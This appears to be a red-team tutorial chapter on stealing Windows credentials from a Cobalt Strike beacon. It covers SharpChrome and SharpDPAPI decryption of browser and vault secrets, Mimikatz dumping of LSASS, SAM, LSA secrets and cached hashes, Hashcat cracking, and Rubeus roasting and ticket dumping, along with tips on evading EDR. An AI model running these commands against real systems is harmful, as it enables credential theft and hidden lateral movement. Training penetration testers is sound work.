# Creds Access

Credential access is where **post-exploitation starts paying dividends**.  

Instead of fighting the same machine repeatedly, you pivot using **real user credentials**, **tickets**, or **hashes** that let you move _naturally_ through the environment.

Windows gives us **multiple credential storage layers**, each designed for usability ; and each exploitable in different ways.

In this chapter we focus on the most common places where credentials live on Windows systems:

- Web browsers (saved logins)
- Windows Credential Manager (RDP, Wi-Fi, etc.)
- Operating System caches & memory (LSASS, SAM, LSA Secrets, cached domain creds)
- Kerberos tickets & roasting attacks


## üåê Credentials from Web Browsers

Modern browsers try to make life easy for users, and attackers benefit from that.

Most Chromium-based browsers (Chrome, Edge, Brave, etc.) store credentials in a **SQLite database**, encrypted using **DPAPI**, tied to the **current user context**.

üìç Typical location:

```
%LOCALAPPDATA%\<Vendor>\<Browser>\User Data\Default\Login Data
```

Example:

```
C:\Users\dr34mhacks\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

**How to extract them in Cobalt Strike**

Use SharpChrome (or similar SharpDPAPI-based tools):

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

**Output example** (simplified):

```
URL: https://mail.hacker.com
Username: dr34m@hacker.com
Password: Winter2026!
...
```

Why it works from medium integrity:

DPAPI master keys are protected per-user. If you run as the logged-in user (medium integrity), you can decrypt credentials saved by that user, no SYSTEM needed.

**When it fails**

- User never saved passwords
- Browser uses different encryption (Firefox uses NSS)
- DPAPI keys are protected by additional factors (rare)

**OPSEC notes:**

> Very low noise, just file read. Many EDRs don't flag SQLite access in user profile. Still, avoid if user is actively using browser.


## üóùÔ∏è Windows Credential Manager / Windows Vault


Windows has a built-in secure storage called **Credential Manager** (or Windows Vault) where it saves credentials for:

- Remote Desktop (RDP)
- Mapped network drives
- Wi-Fi networks
- Generic web credentials
- Application-specific logins

These are stored encrypted, again using DPAPI + per-credential AES keys.

**Quick Check (no decryption)**

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

**Output:**

```
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource:        Domain:target=TERMSRV/10.10.121.11
Identity:        Administrator
Hidden:          No
```

**Full decryption with SharpDPAPI**

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

**Output example**:

```
Folder: C:\Users\dr34mhacks\AppData\Local\Microsoft\Credentials\

CredFile: 9CAEEF854B7712E966B47C751DFE9AD2
  TargetName: Domain:target=TERMSRV/hack-ds-1
  UserName:   HACK-DS-1\Administrator
  Credential: Passw0rd123!
```

> üîê `/rpc` leverages **MS-BKRP**, allowing the **Domain Controller** to decrypt the master key.

**Privilege needed** ‚Üí Medium integrity (user context) 

**OPSEC** ‚Üí Low ‚Äî file read + occasional RPC to DC (looks like normal backup traffic).

#### üß† Credential Storage Overview

| Source           | Integrity Needed | Reusable   | OPSEC         |
| ---------------- | ---------------- | ---------- | ------------- |
| Browser creds    | Medium           | Yes        | üü¢ Very quiet |
| Windows Vault    | Medium           | Yes        | üü¢ Quiet      |
| Cached creds     | SYSTEM           | Crack only | üü° Medium     |
| LSASS            | SYSTEM           | Yes        | üî¥ Loud       |
| Kerberos tickets | High             | Yes        | üü¢ Quiet      |



### üíæ OS Credential Dumping

Once SYSTEM is obtained, the OS itself becomes a credential database.

> All techniques below **require SYSTEM** (NT/Authority).


#### üß† LSASS Memory

`LSASS.exe` is the process responsible for authentication. It keeps:

- NTLM hashes
- Kerberos keys
- Clear-text passwords (if WDigest enabled - rare now)
- DPAPI master keys

**Built-in Mimikatz in Cobalt Strike**

```
beacon> mimikatz sekurlsa::logonpasswords
```

**Output (NTLM example):**

```
User Name: dr34mhacks
Domain:    HACKME
NTLM:      fc525c9683e8fe067095ba2ddc971889
```

Output Usage:

- Pass-the-Hash
- Offline cracking (Hashcat mode 1000) - `.\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule`

**Kerberos keys:**

```
beacon> mimikatz sekurlsa::ekeys
```

Despite labels like des_cbc_md4, hashes may actually be:

- AES256
- AES128
- RC4

Output Usage:

 - Cracking AES is slow
- Using the keys directly for ticket requests is far better

**OPSEC warning ‚Äì very important**

> Dumping LSASS usually triggers EDR alerts (Sysmon Event ID 10 ‚Äì process access with 0x1010 mask). It is generally a **bad idea from an OPSEC perspective**, and best avoided where possible, Many modern EDRs block or log minidumps / memory reads of LSASS. This applies for the kerberos keys dump as well. 


### üóÇÔ∏è Security Account Manager (SAM)

SAM stores **local account hashes**.

Local account hashes stored in registry hives:

> `HKLM\SAM` + `HKLM\SYSTEM`

**Command:**

```
beacon> mimikatz !lsadump::sam
```

**Output**:

```
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
```

**Use case** ‚Üí Crack or PtH (pass-the-hash) on local accounts.

**Important note:**

- RID 500 = local Administrator
- Often disabled
- But reused passwords across machines = lateral gold


## üîê LSA Secrets

LSA Secrets often contain:

- Service account passwords
- Machine account password
- Scheduled task creds

Adversaries can extract secrets that are cached in memory, or directly from the¬†`HKLM/Security/Policy/Secrets`¬†registry hive.¬† These are encrypted, but the key is stored in¬†`HKLM/Security/Policy`.

> Mimikatz's¬†`lsadump::secrets`¬†command will automatically fetch and decrypt the secrets.

```
beacon> mimikatz !lsadump::secrets

..snip..
Secret: $MACHINE.ACC
NTLM: 3cad4d50decc7d04e6fec0a3c3793cc0
..snip..
```


### üíº Cached Domain Credentials


Domain credentials cached locally (default 10) for offline logon. Stored as MS-Cache v2 hashes (very slow to crack).

Stored as:

- **MS-Cache v2**
- Cannot be pass-the-hash
- Must be cracked offline

```
beacon> mimikatz !lsadump::cache
```

**Output:**

```
User: HACKME\sid
MsCacheV2: 3566ba05cfe9d5314144ebef07289cdc
```

**Crack** ‚Üí Hashcat mode 2100 (very slow ‚Äì ~1 MH/s on good GPU)


###  Kerberos Attacks Summary Table


| Technique       | Privilege | Goal                                | Tool/Command         | Crackable?     | OPSEC Risk  |
| --------------- | --------- | ----------------------------------- | -------------------- | -------------- | ----------- |
| AS-REP Roasting | Any user  | Crack accounts w/o preauth          | Rubeus asreproast    | Yes (RC4 fast) | Medium      |
| Kerberoasting   | Any user  | Crack service account passwords     | Rubeus kerberoast    | Yes (RC4 fast) | Medium-High |
| Ticket Dumping  | SYSTEM    | Reuse existing TGTs/service tickets | Rubeus dump / triage | No (reuse)     | Low         |
| Ticket Renewal  | Any       | Extend TGT lifetime                 | Rubeus renew         | No (reuse)     | Low         |


**AS-REP Roasting example**:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

**Kerberoasting example**:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
```

**Ticket dump example**:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```

**Renew example**:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:<base64> /nowrap
```


**Final pro tips**

- Always prefer **ticket dumping & reuse** over hash dumping (far stealthier)
- Use **/nowrap** with Rubeus to avoid line breaks
- Crack RC4 hashes first (faster) ‚Äî AES is very slow
- Enumerate first (ADSearch, PowerView) ‚Üí roast selectively to reduce noise

